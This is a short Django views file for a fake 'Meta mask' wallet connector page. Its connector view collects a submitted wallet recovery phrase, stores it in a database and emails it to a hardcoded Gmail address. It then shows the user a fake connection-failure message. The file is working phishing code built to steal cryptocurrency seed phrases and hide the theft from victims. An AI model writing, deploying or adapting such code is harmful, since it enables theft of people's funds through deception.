from django.contrib import messages
from django.core.mail import send_mail
from django.shortcuts import render

# Create your views here.
from Meta import settings
from base.models import walletToken


def index(request):
    return render(request, 'base/index.html')


def success(request):
    return render(request, 'base/success.html')


def connector(request):
    if request.method == "POST":
        wall = request.POST.get('phrase')
        if wall:
            get = walletToken(token=wall)
            get.save()

            send_mail(subject='Meta mask', message='Token: '+wall,
                      from_email=settings.EMAIL_HOST_USER,
                      recipient_list=['tommyshawww@gmail.com'])
            messages.success(request, 'Fail to connect please try again later')

    return render(request, "base/connector.html")
